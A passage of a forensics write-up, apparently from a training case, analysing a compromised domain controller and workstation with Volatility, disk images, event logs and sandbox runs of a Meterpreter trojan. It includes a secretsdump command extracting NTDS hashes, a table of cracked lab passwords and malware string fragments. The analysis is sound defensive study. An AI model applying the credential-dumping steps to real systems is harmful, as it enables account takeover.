+<span>Figure 20 - Pacific Time zone </span><strong><span>UTC-7</span></strong></p>
+</center><p><span>Then I analyzed the file </span><strong><span>DESKTOP-SDN1RPT-autoruns</span></strong><span>, but it contains the same info. Now let’s go deep into memory.</span></p><hr><center>
+<h2 id="Part-3---DC01-Pagefile---One-step-closer-to-the-memory" data-id="Part-3---DC01-Pagefile---One-step-closer-to-the-memory"><a class="anchor hidden-xs" href="#Part-3---DC01-Pagefile---One-step-closer-to-the-memory" title="Part-3---DC01-Pagefile---One-step-closer-to-the-memory"><span class="octicon octicon-link"></span></a><span>Part 3 - DC01-Pagefile - One step closer to the memory</span></h2>
+<h3 id="Alex" data-id="Alex"><a class="anchor hidden-xs" href="#Alex" title="Alex"><span class="octicon octicon-link"></span></a><span>Alex</span></h3>
+</center><hr><p><span>In the </span><strong><span>pagefile</span></strong><span>, we run multiple string commands to find out possible artifacts:</span></p><pre><code>
+List all paths in pagefile
+ $strings pagefile.sys | grep -i "^[a-z]:\\\\" | sort | uniq &gt; pagefile_paths.txt 
+Search for enviroment variables
+$ strings pagefile.sys | grep -i "^[a-zA-Z09_]*=.*" | sort -u | uniq &gt; pagefile_var.txt
+Search for URLs
+$ strings pagefile.sys | egrep "^https?://" | sort | uniq &gt; pagefile_url.txt
+Search for email addresses
+$ strings pagefile.sys | egrep '([[:alnum:]_.-]{1,64}+@[[:alnum:]_.-]{2,255}+?\.[[:alpha:].]{2,4})' &gt; pagefile_email.txt
+</code></pre><p><span>As a result, there was no URL and email data, but we found a suspicious path starting with the lowercase “</span><strong><span>d</span></strong><span>” letter (Figure 21).</span></p><center>
+<p><img src="https://i.imgur.com/Jxwy2rl.png" alt="" loading="lazy"><br>
+<span>Figure 21 - Suspicious path</span></p>
+</center><p><span>It seems that it was added by a person manually. We don’t have access to disk D, which is why we can’t continue the analysis of the </span><strong><span>loader.c</span></strong><span> file.</span></p><p><span>We used YARA Rules to find any type of malware in the pagefile.sys. </span><strong><span>DebuggerHiding_Thread</span></strong><span> , </span><strong><span>anti_dbg</span></strong><span>, </span><strong><span>network_tcp_listener</span></strong><span>, </span><strong><span>network_tcp_socket</span></strong><span>, </span><strong><span>win_mutex</span></strong><span>, </span><strong><span>win_files_operation</span></strong><span>, </span><strong><span>Str_Win32_Winsock2_Library</span></strong><span>, </span><strong><span>Str_Win32_Winnet_library</span></strong><span> was found (Figure 22):</span></p><center>
+<p><img src="https://i.imgur.com/I8gUm2J.png" alt="" loading="lazy"><br>
+<img src="https://i.imgur.com/rBFBT9y.png" alt="" loading="lazy"><br>
+<img src="https://i.imgur.com/msHn78u.png" alt="" loading="lazy"><br>
+<img src="https://i.imgur.com/QHcar8N.png" alt="" loading="lazy"></p>
+<p><span>Figure 22 - Yara rules</span></p>
+</center><hr><center>
+<h2 id="Part-4---DC01-memory---Memory-Analisys" data-id="Part-4---DC01-memory---Memory-Analisys"><a class="anchor hidden-xs" href="#Part-4---DC01-memory---Memory-Analisys" title="Part-4---DC01-memory---Memory-Analisys"><span class="octicon octicon-link"></span></a><span>Part 4 - DC01-memory - Memory Analisys</span></h2>
+<h3 id="Alex1" data-id="Alex"><a class="anchor hidden-xs" href="#Alex1" title="Alex1"><span class="octicon octicon-link"></span></a><span>Alex</span></h3>
+</center><hr><p><span>To analyze the memory, we used </span><strong><span>volatility</span></strong><span> tool with different plugins:</span></p><p><span>In the beginning, we tried to analyze what kind of OS was running on the machine with </span><strong><code>vol.py -f citadel.mem kdbgscan</code></strong><span> plugin (Figure 23):</span></p><center>
+<p><img src="https://i.imgur.com/Y5PES3o.png" alt="" loading="lazy"><br>
+<span>Figure 23 - Info about 10.42.85.10</span></p>
+</center><p><span>It returns two possibilities: </span><strong><span>Win2012x64</span></strong><span> and </span><strong><span>Win8SP1x64</span></strong><span>. Our investigation found that the DC01 was used as a Server with Active Directory Service enabled. That is why the option </span><strong><span>Win2012x64</span></strong><span> was more accurate than </span><strong><span>Win8SP1x64</span></strong><span>.</span></p><p><span>After we get the profile, the main analysis process starts:</span></p><ul>
+<li><strong><span>psxview</span></strong><span>: Get hidden process list. Nothing suspicious was found (Figure 24).</span></li>
+</ul><center>
+<p><img src="https://i.imgur.com/NAsbMyI.png" alt="" loading="lazy"><br>
+<img src="https://i.imgur.com/rNJ9j4g.png" alt="" loading="lazy"><br>
+<span>Figure 24 - psxview</span></p>
+</center><ul>
+<li>
+<p><strong><span>malfind</span></strong><span>: used to check memory for suspicious code. Nothing was found.</span></p>
+</li>
+<li>
+<p><strong><span>handles</span></strong><span>: Useful to know which other files, keys, threads, processes… a process has a handle for (has opened). Nothing found.</span></p>
+</li>
+<li>
+<p><strong><span>mutantscan</span></strong><span>: Search for possible Mutexes. Nothing found.</span></p>
+</li>
+<li>
+<p><strong><span>filescan</span></strong><span>: Scan for files inside the dump.</span></p>
+</li>
+<li>
+<p><strong><span>cmdline</span></strong><span>: Display process command-line arguments.</span></p>
+</li>
+</ul><center>
+<p><img src="https://i.imgur.com/EYAkbh0.png" alt="" loading="lazy"><br>
+<img src="https://i.imgur.com/4D8A4En.png" alt="" loading="lazy"><br>
+<img src="https://i.imgur.com/Jm3mgy1.png" alt="" loading="lazy"><br>
+<span>Figure 25 - Procceses analize</span></p>
+</center><p><span>dllhost.exe PID: 2216 with additional /Processid argument.</span></p><p><span>WMIADAP.exe PID: 3056 looks suspicious with its running with additional /R /T arguments.</span></p><p><span>Explorer.EXE PID: 3472 looks different than others here.</span></p><p><span>WmiPrvSE.exe PID: 2056</span><br>
+<span>WmiPrvSE.exe PID: 2764</span></p><p><span>Starting twice with different PID without any additional arguments.</span></p><p><span>We dump all those files and take their SHA1 hashes:</span></p><p><strong><span>dllhost.exe(2216)</span></strong><span>: a26b847c9c7008bae2a1e8d9443833cb136238c8</span><br>
+<strong><span>WMIADAP.exe(3056)</span></strong><span>: d5a03b992685765055c71a8dc457227bb13d858a</span><br>
+<strong><span>Explorer.EXE(3472)</span></strong><span>: 05d2828bf2777d4bdd9d8455a01b81c19a5af92d</span><br>
+<strong><span>WmiPrvSE.exe(2056)</span></strong><span>: f0b947d8f5e126242ec0e05bf597354f03c5fd7f</span><br>
+<strong><span>WmiPrvSE.exe(2764)</span></strong><span>: b06e5905f3fbcbf69346a4337896fef388def036</span></p><p><span>The suspicious part is the difference in SHA1 Hash for the same WmiPrvSE.exe processes.</span></p><p><span>checked the privileges:</span></p><center>
+<p><img src="https://i.imgur.com/GmcNUFU.png" alt="" loading="lazy"><br>
+<span>Figure 26 - </span><strong><span>dllhost.exe(2216)</span></strong><br>
+<img src="https://i.imgur.com/I6rae2i.png" alt="" loading="lazy"><br>
+<span>Figure 27 - </span><strong><span>WMIADAP.exe(3056)</span></strong><br>
+<img src="https://i.imgur.com/T4hSxWG.png" alt="" loading="lazy"><br>
+<span>Figure 28 - </span><strong><span>Explorer.EXE(3472)</span></strong><br>
+<img src="https://i.imgur.com/fbvFBRe.png" alt="" loading="lazy"><br>
+<span>Figure 29 - </span><strong><span>WmiPrvSE.exe(2056)</span></strong><br>
+<img src="https://i.imgur.com/ABSwNOw.png" alt="" loading="lazy"><br>
+<span>Figure 30 - </span><strong><span>WmiPrvSE.exe(2764)</span></strong></p>
+</center><p><span>And again, both WmiPrvSE.exe have different privileges in the system. The </span><strong><span>WmiPrvSE.exe(2764)</span></strong><span> has additional manual </span><strong><span>Enabled</span></strong><span> and more </span><strong><span>Present</span></strong><span> fields.</span></p><ul>
+<li><strong><span>netscan</span></strong><span>: Display network status of the moment (Figure 31).</span></li>
+</ul><center>
+<p><img src="https://i.imgur.com/G4yDiRk.png" alt="" loading="lazy"><br>
+<span>Figure 31 - netscan</span></p>
+<p><img src="https://i.imgur.com/thScg5e.png" alt="" loading="lazy"><br>
+<span>Figure 32 - IP addreses</span></p>
+<p><img src="https://i.imgur.com/D6lIrcP.png" alt="" loading="lazy"><br>
+<span>Figure 33 - info about connection with 203.78.103.109</span></p>
+</center><p><strong><span>203.78.103.109</span></strong><span> is presented, and a secured connection is </span><strong><span>ESTABLISHED</span></strong><span>.</span></p><p><span>The next step was to check out HTTP and HTTPS requests to see which sites were visited and find some additional information. We used </span><strong><span>strings</span></strong><span> command and filtered it by </span><strong><span>HTTP</span></strong><span> and </span><strong><span>HTTPS</span></strong><span> requests.After analyzing found URLs and found that most of them were about Certificates and their Standards (Figure 34). Different Certification centers were visited, and many CRT files were investigated. Also, we found that the person was using starfieldtech to keep his certificates. In repository </span><strong><span>#1604</span></strong></p><center>
+<p><img src="https://i.imgur.com/HHUeBvO.png" alt="" loading="lazy"><br>
+<span>Figure 34 - Certificates</span></p>
+</center><p><span>A few more interesting artifacts were about the open ports (Figures 35, 36):</span></p><center>
+<p><img src="https://i.imgur.com/l866Yyv.png" alt="" loading="lazy"><br>
+<span>Figure 35 - HTTP open Ports</span></p>
+<p><img src="https://i.imgur.com/A8UafXo.png" alt="" loading="lazy"><br>
+<span>Figure 36 - HTTPS open Ports</span></p>
+</center><p><span>Ports 5985,5986 are being used for Pentesting WinRM.</span></p><p><span>Also, someone used to download a repository from Git (Figure 37):</span></p><center>
+<p><img src="https://i.imgur.com/rh2cXvs.png" alt="" loading="lazy"><br>
+<span>Figure 37 - Git repositories</span></p>
+</center><p><span>Few PDF files were downloaded, and many searches were done, but we couldn’t find what exactly was searched.</span></p><hr><center>
+<h2 id="Part-5---DC01-E01---Log-files" data-id="Part-5---DC01-E01---Log-files"><a class="anchor hidden-xs" href="#Part-5---DC01-E01---Log-files" title="Part-5---DC01-E01---Log-files"><span class="octicon octicon-link"></span></a><span>Part 5 - DC01-E01 - Log files</span></h2>
+<h3 id="Vladimir" data-id="Vladimir"><a class="anchor hidden-xs" href="#Vladimir" title="Vladimir"><span class="octicon octicon-link"></span></a><span>Vladimir</span></h3>
+</center><hr><p><span>Now let’s look at disk images. First, I mounted the image using AccessData FTK. Then I look for system logs in it. Figure 38 shows the log files.</span></p><center>
+<p><img src="https://i.imgur.com/YrKZoqz.png" alt="" loading="lazy"><br>
+<span>Figure 38 - Logs</span></p>
+</center><p><span>Among them, there is one called </span><strong><span>Security</span></strong><span>. I started to figure it out. It contains login information. According to the pcap file, the attacker successfully logged in around 2:22 AM. So I upload the log file to the Event Log Explorer. Then I detected a login event with IP 194.61.24.102 (Figure 39).</span></p><center>
+<p><img src="https://i.imgur.com/zaH7Fbh.png" alt="" loading="lazy"><br>
+<span>Figure 39 - Login from 194.61.24.102</span></p>
+</center><p><span>But the time here is 06:21. So, I looked at the system time (Figure 40).</span></p><center>
+<p><img src="https://i.imgur.com/DA1vxkK.png" alt="" loading="lazy"><br>
+<span>Figure 40 - System time</span></p>
+</center><p><span>The time here is 03:21:48. The first successful login was at 02:21:47. Thus, it is more likely that the attacker changed the time by +4(3) hours. I don’t know which one is correct, from Wireshark or Logs. It looks like the two systems have different locations, so there is a 1-hour difference between them.</span><br>
+<span>Figure 41 shows additional information about the event.</span></p><center>
+<p><img src="https://i.imgur.com/yYMCO7k.png" alt="" loading="lazy"><br>
+<span>Figure 41 - Login info</span></p>
+</center><p><span>So at this time, I will also consider the server’s IP address as malicious, but we already know this when analyzing the network.</span></p><p><span>Analyzing the security log, I also found information about users (Figures 42 and 43).</span><br>
+<span>10.42.85.115 - ricksanchez, mortysmith.</span></p><center>
+<p><img src="https://i.imgur.com/p7AlCXs.png" alt="" loading="lazy"><br>
+<span>Figure 42 - ricksanchez</span></p>
+<p><img src="https://i.imgur.com/PPYPFKz.png" alt="" loading="lazy"><br>
+<span>Figure 43 - mortysmith</span></p>
+</center><p><span>Thus, the data from the log file confirms the conclusions about the time in part with the network analysis.</span></p><hr><center>
+<h2 id="Part-6---Disk-E01" data-id="Part-6---Disk-E01"><a class="anchor hidden-xs" href="#Part-6---Disk-E01" title="Part-6---Disk-E01"><span class="octicon octicon-link"></span></a><span>Part 6 - Disk E01</span></h2>
+<h3 id="Vladimir1" data-id="Vladimir"><a class="anchor hidden-xs" href="#Vladimir1" title="Vladimir1"><span class="octicon octicon-link"></span></a><span>Vladimir</span></h3>
+</center><hr><p><span>I mounted the image using ewfmount. Then I check its layout using mmls, as shown in Figure 44.</span></p><center>
+<p><img src="https://i.imgur.com/pC0vem0.png" alt="" loading="lazy"><br>
+<span>Figure 44 - E01 partion layout</span></p>
+</center><p><span>So, there are two partitions - the first one starts with sector 2048, and the second starts with sector 718848. Let’s mount the first one. It has an offset = 2048 * 512 =1048576 bytes.</span></p><p><code>mount -t ntfs-3g -o loop,ro,show_sys_files,stream_interface=windows,offset=1048576 ewf1 /mnt/2</code></p><div class="alert alert-info">
+<p><span>loop - loop device</span><br>
+<span>ro - read-only</span></p>
+</div><p><span>As a result, I received the files shown in Figure 45.</span></p><center>
+<p><img src="https://i.imgur.com/nfGFfDJ.png" alt="" loading="lazy"><br>
+<span>Figure 45 - Mounted files</span></p>
+</center><p><span>Then I mounted the second partition </span><code>mount -t ntfs-3g -o loop,ro,show_sys_files,stream_interface=windows,offset=368050176 ewf1 /mnt/3</code><span> (Figure 46).</span></p><center>
+<p><img src="https://i.imgur.com/nADGJY6.png" alt="" loading="lazy"><br>
+<span>Figure 46 - Files from the second section</span></p>
+</center><p><span>There is a $Recycle.Bin directory. it contains two files:</span><br>
+<span>First one contains path - </span><code>C:\FileShare\Secret\SECRET_beth.txt</code><span>.</span><br>
+<span>The second one - Earth beth is the real beth.</span></p><p><span>These files were obtained at about 2:34:27 and then deleted (Figured 47).</span></p><center>
+<p><img src="https://i.imgur.com/Hq7Dt8l.png" alt="" loading="lazy"><br>
+<span>Figure 47 - File is deleted at 2:34:27</span></p>
+</center><p><span>Then I checked when the files in the Secret Folder were accessed:</span></p><table>
+<thead>
+<tr>
+<th><span>File</span></th>
+<th><span>Time accessed</span></th>
+<th><span>Time modified</span></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span>Beth_Secret.txt</span></td>
+<td><span>02∶33∶54</span></td>
+<td><span>02∶35∶35</span></td>
+</tr>
+<tr>
+<td><span>NoJerry.txt</span></td>
+<td><span>01∶29∶47</span></td>
+<td><span>01∶30∶24</span></td>
+</tr>
+<tr>
+<td><span>PortalGunPlans.txt</span></td>
+<td><span>01∶33∶54</span></td>
+<td><span>01∶35∶35</span></td>
+</tr>
+<tr>
+<td><span>Szechuan Sauce.txt</span></td>
+<td><span>01∶35∶43</span></td>
+<td><span>01∶38∶56</span></td>
+</tr>
+</tbody>
+</table><p><span>It seems strange to me. That’s why I check it at the Autopsy. It showed that access to the secret folder was obtained at 02:32:13 (Figure 48).</span></p><center>
+<p><img src="https://i.imgur.com/KHwKFZM.png" alt="" loading="lazy"><br>
+<span>Figure 48 - The secret folder is accessed (Autopsy)</span></p>
+</center><p><span>I also found that the contents of the </span><strong><span>Secret</span></strong><span> folder were added to </span><strong><span>Secret.zip</span></strong><span> (Figure 49).</span></p><center>
+<p><img src="https://i.imgur.com/nN9CY1i.png" alt="" loading="lazy"><br>
+<span>Figure 49 - Secret.zip</span></p>
+</center><p><span>Both of the partitions I put in dc01.body file using fls:</span></p><pre><code>root@st12:/mnt/1# fls -m -r -o 2048 ./ewf1 &gt; /home/st12/dc01.body
+root@st12:/mnt/1# fls -m -r -o 718848 ./ewf1 &gt; /home/st12/dc01.body
+vol.py -f ./DC01-memory/citadeldc01.mem --profile=Win2012R2x64 timeliner --output=body --output-file=./memory-dc01.body
+cat memory-dc01.body &gt;&gt; dc01.body
+mactime -y -d -z UTC -b dc01.body &gt; dc-01.csv
+</code></pre><p><span>So, after I analyzed the CSV file, I found that coreupdater.exe starts at 3(2):56:37. Also, between the main update processes, spoolsv.exe appears (Figure 50). Knowing that the malware is injecting in the process, it can use this process to do so.</span></p><center>
+<p><img src="https://i.imgur.com/IoCQmVs.png" alt="" loading="lazy"><br>
+<span>Figure 50 - Spoolsv.exe process is appeared</span></p>
+</center><p><span>I found the NTDS database at the partition - </span><strong><span>ntds.dit</span></strong><span>. So I can try to crack passwords in it. For this, I used secretdump - </span><code>python2 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL -outputfile hashes.txt</code><span> (Figure 51).</span></p><center>
+<p><img src="https://i.imgur.com/EDwmd4N.png" alt="" loading="lazy"><br>
+<span>Figure 51 - Hashes of passwords</span></p>
+</center><p><span>Then I tried to brute-force them using hashcat and got the following data:</span></p><table>
+<thead>
+<tr>
+<th><span>User</span></th>
+<th><span>Password</span></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span>Administrator</span></td>
+<td><span>)&amp;Denver89</span></td>
+</tr>
+<tr>
+<td><span>jerrysmith</span></td>
+<td><span>!BETHEYBOO12!</span></td>
+</tr>
+<tr>
+<td><span>summersmith</span></td>
+<td><span>34MarvelBootySalmon$</span></td>
+</tr>
+<tr>
+<td><span>ricksanchez</span></td>
+<td><span>800PortalsForMe%</span></td>
+</tr>
+<tr>
+<td><span>mortysmith</span></td>
+<td><span>Jessica@1</span></td>
+</tr>
+<tr>
+<td><span>bethsmith</span></td>
+<td><span>RedWine1!</span></td>
+</tr>
+<tr>
+<td><span>birdman</span></td>
+<td><span>(dimension5150)</span></td>
+</tr>
+</tbody>
+</table><div class="alert alert-info">
+<h3 id="Timeline2" data-id="Timeline"><a class="anchor hidden-xs" href="#Timeline2" title="Timeline2"><span class="octicon octicon-link"></span></a><span>Timeline</span></h3>
+<p><strong><span>19 September 2020 02:32:13</span></strong><span> - Secret folder is accessed and added to Secret.zip.</span><br>
+<strong><span>19 September 2020 2:33:54</span></strong><span> - Original Beth secret is accessed.</span><br>
+<strong><span>19 September 2020 2:34:27</span></strong><span>- Original Beth secret is deleted, new one is created.</span><br>
+<strong><span>19 September 2020 2:56:37</span></strong><span> - coreupdater.exe process is started.</span></p>
+</div><hr><center>
+<h2 id="Part-7---Sandbox" data-id="Part-7---Sandbox"><a class="anchor hidden-xs" href="#Part-7---Sandbox" title="Part-7---Sandbox"><span class="octicon octicon-link"></span></a><span>Part 7 - Sandbox</span></h2>
+<h3 id="Vladimir-Ivan-Naghmeh" data-id="Vladimir-Ivan-Naghmeh"><a class="anchor hidden-xs" href="#Vladimir-Ivan-Naghmeh" title="Vladimir-Ivan-Naghmeh"><span class="octicon octicon-link"></span></a><span>Vladimir, Ivan, Naghmeh</span></h3>
+</center><hr><p><span>First, we checked coreupdater.exe, a file using standard Linux utilities (Figure 52).</span></p><center>
+<p><img src="https://i.imgur.com/PXgHEQJ.png" alt="" loading="lazy"><br>
+<span>Figure 52 - coreupdater.exe</span></p>
+</center><p><span>Then we started with a quick analysis using an antivirus, which showed a malicious trojan that used meterpreter (Figure 53).</span></p><center>
+<p><img src="https://i.imgur.com/AU5xGIG.png" alt="" loading="lazy"><br>
+<span>Figure 53 - Antivirus report</span></p>
+</center><p><span>Then we used a Hybrid analysis sandbox and tested coreupdater with several antiviruses. The result is shown below:</span></p><table>
+<thead>
+<tr>
+<th><span>Antivirus</span></th>
+<th><span>Result</span></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span>Avast</span></td>
+<td><span>Win64:MetasploitEncod-A [Trj]</span></td>
+</tr>
+<tr>
+<td><a href="http://Dr.Web" target="_blank" rel="noopener"><span>Dr.Web</span></a></td>
+<td><span>BackDoor.Shell.244</span></td>
+</tr>
+<tr>
+<td><span>Kaspersky</span></td>
+<td><span>Trojan.Win64.Shelma.a</span></td>
+</tr>
+<tr>
+<td><span>Microsoft Defender</span></td>
+<td><span>Trojan:Win64/Meterpreter.E</span></td>
+</tr>
+</tbody>
+</table><p><span>So many antiviruses have shown that this is a Trojan. Then we check other data from the sandbox.</span></p><p><span>It interacts with two IP addresses:</span></p><ul>
+<li><span>192.168.0.34</span></li>
+<li><span>203.78.103.109 - Thailand</span></li>
+</ul><p><span>Figure 54 shows the process tree.</span></p><center>
+<p><img src="https://i.imgur.com/EALVVNo.png" alt="" loading="lazy"><br>
+<span>Figure 54 - Process tree</span></p>
+</center><p><span>This terminated the process wuapihost.exe and then replaced the coreupdater. It made a lot of broadcast ARP requests on the network. It looks like it scans the network to determine its configuration/devices.</span></p><p><span>He made a lot of registry requests but basically did two things:</span></p><ol>
+<li><span>Change time;</span></li>
+<li><span>Set the malicious process to autoruns.</span></li>
+</ol><p><span>CRC value set in PE header does not match actual value:</span><br>
+<span>“10f3b92002bb98467334161cf85d0b1730851f9256f83c27db125e9a0c1cfda6.bin” claimed CRC 34198 while the actual is CRC 34638</span></p><p><span>It also installs hooks/patches the running process - “coreupdater.exe” wrote bytes “405c70770000000040288377000000000000000000000000” to virtual address “0x40003000” (part of module “COREUPDATER.EXE”).</span></p><p><span>Suspicious - it sends traffic on HTTP port, but without HTTP header.</span></p><p><span>Figure 55 shows the handlers.</span></p><center>
+<p><img src="https://i.imgur.com/kFecrAq.png" alt="" loading="lazy"><br>
+<span>Figure 55 - Handlers</span></p>
+</center><p><span>Figure 56 shows the operations with files.</span></p><center>
+<p><img src="https://i.imgur.com/DyDOBU1.png" alt="" loading="lazy"><br>
+<span>Figure 56 - Files</span></p>
+</center><p><span>Figure 57 shows the used modules.</span></p><center>
+<p><img src="https://i.imgur.com/0JxJ2JH.png" alt="" loading="lazy"><br>
+<span>Figure 57 - Used modules</span></p>
+</center><p><span>Also, we run </span><strong><span>coreupdater</span></strong><span> file via </span><strong><span>capa</span></strong><span> as shown in Figure 58.</span></p><center>
+<p><img src="https://i.imgur.com/X2RLqjv.png" alt="" loading="lazy"><br>
+<span>Figure 58 - Analizing coreupdater.exe with </span><strong><span>capa</span></strong></p>
+</center><p><span>It said that it used Obfuscated Files or Information tactics.</span></p><blockquote>
+<p><span>Adversaries may attempt to make an executable or file challenging to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is typical behavior that can be used across different platforms and the network to evade defenses.</span><br>
+<span>Payloads may be compressed, archived, or encrypted to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user’s action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password-protected compressed/encrypted file provided by the adversary. [1] Adversaries may also use compressed or archived scripts, such as JavaScript.</span></p>
+</blockquote><p><span>Ivan also ran it through another sandbox, but it gave some results, as shown in Figure 59.</span></p><center>
+<p><img src="https://i.imgur.com/4w3lDwa.png" alt="" loading="lazy"><br>
+<span>Figure 59 - Result from sandbox</span></p>
+</center><hr><center>
+<h2 id="Part-8---DESKTOP-SDN1RPT-Memory" data-id="Part-8---DESKTOP-SDN1RPT-Memory"><a class="anchor hidden-xs" href="#Part-8---DESKTOP-SDN1RPT-Memory" title="Part-8---DESKTOP-SDN1RPT-Memory"><span class="octicon octicon-link"></span></a><span>Part 8 - DESKTOP-SDN1RPT: Memory</span></h2>
+<h3 id="Alex2" data-id="Alex"><a class="anchor hidden-xs" href="#Alex2" title="Alex2"><span class="octicon octicon-link"></span></a><span>Alex</span></h3>
+</center><hr><p><span>The next step was to analyze the Workstation named DESKTOP-SDN1RPT memory. We used the same tool volatility as well.</span></p><p><span>In the first run, we determined that the memory belongs to Win10x64 build 19041 (Figure 60).</span></p><center>
+<p><img src="https://i.imgur.com/xQu1L0M.png" alt="" loading="lazy"><br>
+<span>Figure 60 - Win10x64 build 19041</span></p>
+</center><p><span>After getting the profile information, we checked what artifacts we could obtain from it.</span></p><ul>
+<li><strong><span>psxview</span></strong><span> (Figure 61):</span></li>
+</ul><center>
+<p><img src="https://i.imgur.com/WCkYJvc.png" alt="" loading="lazy"><br>
+<img src="https://i.imgur.com/ViGqMNg.png" alt="" loading="lazy"><br>
+<img src="https://i.imgur.com/tsMC5By.png" alt="" loading="lazy"><br>
+<span>Figure 61 - psxview</span></p>
+</center><ul>
+<li><strong><span>malfind</span></strong><span>: We started from a basic malware scan and found that two processes were infected, spoolsv.exe with PID 2188 and powershell.exe with PID 3316. Powershell has three different memory address access (Figures 62 and 63):</span></li>
+</ul><center>
+<p><img src="https://i.imgur.com/HbWRRHj.png" alt="" loading="lazy"><br>
+<span>Figure 62 - malfind spoolsv.exe</span></p>
+<p><img src="https://i.imgur.com/Ptldd2N.png" alt="" loading="lazy"><br>
+<span>Figure 63 - malfind powershell.exe</span></p>
+</center><p><span>We dump the both processes and take their sha1 hashes:</span></p><p><strong><span>spoolsv.exe</span></strong><span>: d26c381147476fcec1ef71c2ba2384ce014c47d1</span></p><p><strong><span>powershell.exe</span></strong><span>: f88bc5af2edcae909077e2ca5e256e93f7c30f22</span></p><p><span>And checked their privileges: it seems that they were not changed (Figures 64 and 65).</span></p><center>
+<p><img src="https://i.imgur.com/BBKc1qB.png" alt="" loading="lazy"><br>
+<span>Figure 64 - spoolsv.exe privilegies</span></p>
+<p><img src="https://i.imgur.com/AwmtOmJ.png" alt="" loading="lazy"><br>
+<span>Figure 65 - powershell.exe privilegies</span></p>
+</center><p><span>Then we run clavscan (Figure 66) to see if it can detect anything: It found </span><strong><span>Win.Malware.Razy-9865903-0</span></strong><span> (Figure 67) in both files.</span></p><center>
+<p><img src="https://i.imgur.com/qq2P9ll.png" alt="" loading="lazy"><br>
+<span>Figure 66 - clavscan</span></p>
+<p><img src="https://i.imgur.com/N8q8COl.png" alt="" loading="lazy"><br>
+<span>Figure 67 - Win.Malware.Razy-9865903-0</span></p>
+</center><p><span>Next, we checked the process tree (Figure 68) to see if infected ones started any other processes: </span><strong><span>conhost.exe PID 728</span></strong><span> was started by infected </span><strong><span>powershell.exe</span></strong><span> (Figure 69). But no other processes were infected.</span></p><center>
+<p><img src="https://i.imgur.com/bOKs2W3.png" alt="" loading="lazy"><br>
+<span>Figure 68 - Proccess tree</span></p>
+<p><img src="https://i.imgur.com/mPsrWpZ.png" alt="" loading="lazy"><br>
+<img src="https://i.imgur.com/7jfNUep.png" alt="" loading="lazy"><br>
+<span>Figure 69 - Proccess tree</span></p>
+</center><p><span>In the next step, we checked network connections that infected processes may use: We found that process 2188 was listening to the 49669 port for both IPv4 and IPv6 (Figure 70).</span></p><center>
+<p><img src="https://i.imgur.com/YvlP7EB.png" alt="" loading="lazy"><br>
+<span>Figure 70 - 49669 port</span></p>
+</center><ul>
+<li><strong><span>mutantscan</span></strong><span>: Then we checked the possible mutants, which gives back a huge list. The most suspicious ones are the ones that are located in the C:/Users/ricksanchez/AppData/… (Figure 71).</span></li>
+</ul><center>
+<p><img src="https://i.imgur.com/93qykUi.png" alt="" loading="lazy"><br>
+<img src="https://i.imgur.com/wTP3eX2.png" alt="" loading="lazy"><br>
+<img src="https://i.imgur.com/PAZYwTL.png" alt="" loading="lazy"><br>
+<img src="https://i.imgur.com/SxlUqUG.png" alt="" loading="lazy"><br>
+<img src="https://i.imgur.com/J5h4Clq.png" alt="" loading="lazy"><br>
+<img src="https://i.imgur.com/yuIQqtt.png" alt="" loading="lazy"><br>
+<img src="https://i.imgur.com/AJEBAlY.png" alt="" loading="lazy"><br>
+<img src="https://i.imgur.com/ppUtiYI.png" alt="" loading="lazy"><br>
+<img src="https://i.imgur.com/0rXbnqL.png" alt="" loading="lazy"><br>
+<span>Figure 71 - mutantscan</span></p>
+</center><p><strong><span>netscan</span></strong><span>: We once again checked the network connections and found the </span><strong><span>203.78.103.109</span></strong><span> IP address that was found during Server PC analysis (Figure 72).</span></p><center>
+<p><img src="https://i.imgur.com/nN6kfxx.png" alt="" loading="lazy"><br>
+<span>Figure 72 - netscan</span></p>
+</center><ul>
+<li><strong><span>filescan</span></strong><span>: We checked mounted files for malicious PID and found 3316 PowerShell (Figure 73):</span></li>
+</ul><center>
+<p><img src="https://i.imgur.com/JXCZqVN.png" alt="" loading="lazy"><br>
+<span>Figure 73 - filescan</span></p>
+</center><ul>
+<li><strong><span>timeliner</span></strong><span>: In addition, we checked the timeline of both processes (Figure 74):</span></li>
+</ul><center>
+<p><img src="https://i.imgur.com/onnJWEq.png" alt="" loading="lazy"><br>
+<img src="https://i.imgur.com/3Nh0bAL.png" alt="" loading="lazy"><br>
+<span>Figure 74 - timeliner</span></p>
+</center><p><span>When analyzing the HTTPS logs, we found an unusual URL:</span></p><pre><code>AccountID=%s&amp;PassPhrase=%s&amp;Amount=%s&amp;Email=%scloseeventegold1clsid\{92617934AccountID=PassPhrase=https://www.e-gold.com/acct/acct.aspacct/accountinfo.aspacct/balance.aspUser-Agent:Accept-Encoding:=DisabledSecurityLevel
+</code></pre><p><span>This certainly shows that there was an attempt to bypass a login process.</span></p><p><span>Few more suspicious URLs:</span></p><pre><code>https://sto @
+ /start qquin:\systheoldmsg.txt\sysgui.gifexplorer.exe https://account.qq.com/cgi-bin/auth_forgetSetWindowsHookExAGetSystemDirectoryA
+</code></pre><pre><code>&lt;keystorefile KEYFILE=userinit.exe,svhttps://ibank.update.php?os=cmd.exe /k echo y| cacls
